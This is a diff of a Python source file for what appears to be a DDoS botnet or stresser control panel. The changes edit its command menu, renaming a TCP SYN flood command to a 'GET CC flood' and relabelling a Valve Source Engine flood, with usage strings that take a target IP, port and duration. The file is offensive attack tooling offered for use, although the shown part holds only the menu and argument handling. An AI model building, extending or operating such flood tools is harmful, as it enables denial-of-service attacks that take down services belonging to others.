@@ -119,10 +119,10 @@ def command_line(client):
                 send(client, '')
 
             elif command == 'METHODS':
-                send(client, '.syn: TCP SYN flood')
+                send(client, '.cc: GET CC flood')
                 send(client, '.tcp: TCP junk flood')
                 send(client, '.udp: UDP junk flood')
-                send(client, '.hex: UDP Valve Source Engine specific flood')
+                send(client, '.hex: UDP hex flood')
                 send(client, '.http: HTTP GET request flood')
                 send(client, '')
 
@@ -157,7 +157,7 @@ def command_line(client):
                     send(client, 'Usage: .hex [IP] [PORT] [TIME]')
 
             # TCP SYNchronize flood           
-            elif command == '.SYN':
+            elif command == '.CC':
                 if len(args) == 4:
                     ip = args[1]
                     port = args[2]
@@ -174,7 +174,7 @@ def command_line(client):
                     else:
                         send(client, Fore.RED + 'Invalid IP-address')
                 else:
-                    send(client, 'Usage: .syn [IP] [PORT] [TIME]')
+                    send(client, 'Usage: .cc [IP] [PORT] [TIME]')
                     send(client, 'Use port 0 for random port mode')
                     
             # TCP junk data packets flood
